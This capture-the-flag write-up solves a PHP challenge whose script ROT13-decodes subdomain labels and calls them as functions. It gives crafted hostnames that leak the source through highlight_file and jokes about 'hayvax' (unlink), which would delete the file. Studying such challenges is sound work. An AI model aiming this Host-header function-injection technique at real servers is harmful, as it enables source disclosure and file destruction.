# Challenge 37 - CTF Tuning Master (Read)

We were given two URLs with respective contents as followed:

http://偽女子.柳枊曳曳棘朿.ctf通靈師.hkcert.dsa.2048.pub:28237

```
3734363665383864343539356638366230643534353466336439316435373639
```

http://偽女子.哪咧嘩唔咬哤.ctf通靈師.hkcert.dsa.2048.pub:28237

```
(a bunch of binary characters with Base64 dGbojUWV+GsNVFTz2R1XaQ==)
```

So we tried to change the part before `.ctf通靈師` to something else. We kept the `ctf通靈師` part because we know that the other subdomains are not involved in this challenge.

When we try http://testtesttest.testtesttest.xn--ctf-tk2f171td9i.hkcert.dsa.2048.pub:28237/, we were surprised to see a very verbose error message:

```
Fatal error: Uncaught Error: Call to undefined function rf() in /var/www/html/index.php:1 Stack trace: #0 [internal function]: {closure}('/var/www/html/i...', 'testtesttest') #1 /var/www/html/index.php(1): array_reduce(Array, Object(Closure), '/var/www/html/i...') #2 {main} thrown in /var/www/html/index.php on line 1
```

`rf` huh?

We also try something else like:

http://柳枊曳曳棘朿.偽女子.ctf通靈師.hkcert.dsa.2048.pub:28237

```
0e59065f44468ea117a0832cd8a8b0af
```

(A gut feeling tells me this is an MD5 hash, but a search of this MD5 string shows nothing.)


http://哪咧嘩唔咬哤.偽女子.ctf通靈師.hkcert.dsa.2048.pub:28237
```

Warning: hex2bin(): Hexadecimal input string must have an even length in /var/www/html/index.php on line 1
d41d8cd98f00b204e9800998ecf8427e
```

Now this `hex2bin` warning is interesting. When we tested a bit more, it became clear that the characters the first five and the last five characters in each of the domain segments are ignored. It is then processed by the highly secretive ROT13.

Once that is understood, we know that `偽女子`, when presented as [Punycode](https://en.wikipedia.org/wiki/Punycode), is `xn--czq51t5pb`. With only the central bytes ROT13'd, we got `md5`. Whoa!

We then used `print_r` to see what is happening. We went http://00000cevag_e00000.xn--ctf-tk2f171td9i.hkcert.dsa.2048.pub:28237/, and:

```
/var/www/html/index.php1
```

Aha! So it seems where the script is (`__FILE__`) is passed into the `print_r` (the last `1` is likely due to the `echo` of the status return from `print_r`). Then let's do `highlight_file` next then!

http://00000uvtuyvtug_svyr00000.xn--ctf-tk2f171td9i.hkcert.dsa.2048.pub:28237/

```
<?=array_reduce(explode(".",$_SERVER["HTTP_HOST"],-5),function($p,$q){return str_rot13(substr($q,5,-5))($p);},__FILE__);//(flag here) 1
```

Solved with [a Yu Gi-Oh! reference](https://dic.nicovideo.jp/a/ha%E2%98%86na%E2%98%86se)!

Oh yes, `hayvax` does not work ;)
